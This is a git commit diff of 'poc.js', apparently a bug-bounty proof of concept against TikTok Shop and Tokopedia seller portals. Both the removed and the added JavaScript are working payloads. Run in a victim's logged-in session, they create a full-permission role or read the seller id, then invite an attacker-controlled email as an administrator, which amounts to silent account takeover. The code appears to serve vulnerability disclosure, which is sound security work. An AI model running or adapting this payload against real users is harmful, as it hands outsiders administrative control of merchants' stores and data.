566f73c7c4e1a47fb3dfa5685ee14b7291018973
johnstonemees <51981550@qq.com>
2026-03-21 22:24:27 +0800

    Update poc.js

--- poc/tiktok/poc.js
+++ poc/tiktok/poc.js
@@ -1,41 +1,58 @@
 (async () => {
   alert(document.domain);
-await fetch("https://api-partner-sg.tiktokshop.com/api/v1/partner/team_member/role_create_or_edit?aid=359713&locale=zh-CN", {
+  alert("Check your users managent,the attacker's account was created with administrator role!");
+  const response1 = await fetch("https://seller-id.tokopedia.com/api/v3/seller/common/get", {
   "headers": {
+    "accept": "*/*",
+    "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
+    "cache-control": "no-cache",
     "content-type": "application/json",
-    "Origin": "https://partner.tiktokshop.com"
+    "pragma": "no-cache",
+    "priority": "u=1, i",
+    "credentials": "include", 
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "same-origin",
+    "tt-ticket-guard-version": "2",
+    "tt-ticket-guard-web-version": "1",
+    "x-tt-oec-region": "ID"
   },
-  "body": '{"action_type":1,"role_name":"attacker_you","permission_key_list":["home","tools_for_tts_sellers","shop_management","service","developer_tool","isv_dashboard","sandbox","api_sdk","api_logs","webhook_log","api_doc","solution_guidance","api_testing_tool","incident_management","openlearn_widgets","my_account","profile","my_authorizations"]}',
-  "method": "POST",
-  "mode": "cors",
-  "credentials": "include"
-}); //add a new role for all privls
-
-// step 2:
-const response = await fetch("https://api-partner-sg.tiktokshop.com/api/v1/partner/team_member/role_list?aid=359713&locale=zh-CN", {
-  "headers": {
-    "Origin": "https://partner.tiktokshop.com"
-  },
+  "referrer": "https://seller-id.tokopedia.com/profile/account-setting/user-management?module=add_user",
   "method": "GET",
   "mode": "cors",
   "credentials": "include"
 });
-const result = await response.json();
-const roleId = result?.data?.permission_roles?.find?.(role => role?.role_name === 'attacker_you')?.role_id ?? null;
-if (roleId) {
-// Step 3:
-  console.log('成功提取role_id:', roleId);
-  fetch("https://api-partner-sg.tiktokshop.com/api/v1/partner/team_member/team_account_operate?aid=359713&locale=zh-CN", {
+const result = await response1.json();
+const sellerId = result.data?.seller?.seller_id;
+console.log(sellerId);
+fetch("https://seller-id.tokopedia.com/api/v1/seller/account_management/invite?locale=en&language=en", {
   "headers": {
+    "accept": "*/*",
+    "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
+    "cache-control": "no-cache",
     "content-type": "application/json",
-    "Origin": "https://partner.tiktokshop.com"
+    "pragma": "no-cache",
+    "priority": "u=1, i",
+    "credentials": "include", 
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "same-origin",
+    "tt-ticket-guard-version": "2",
+    "tt-ticket-guard-web-version": "1",
+    "x-tt-oec-region": "ID"
   },
-  "body": JSON.stringify({action:1,team_email:"johnstone+attackerme@wearehackerone.com",role_id_list:[roleId]}),
+  "referrer": "https://seller-id.tokopedia.com/profile/account-setting/user-management?module=add_user",
+  "body": JSON.stringify({
+          global_seller_roles: [{
+            global_seller_id: sellerId,
+            roles: [{ identifier: "subaccount_role_full_access" }]
+          }],
+          seller_roles: [],
+          default_language: "en",
+          email: "esperamier+2@bugcrowdninja.com",
+          mobile: "",
+          user_name: "weattacker"
+        }),
   "method": "POST",
   "mode": "cors",
   "credentials": "include"
 });
-} else {
-  console.log('未找到role_name为attacker_you的角色');
-}
 })();
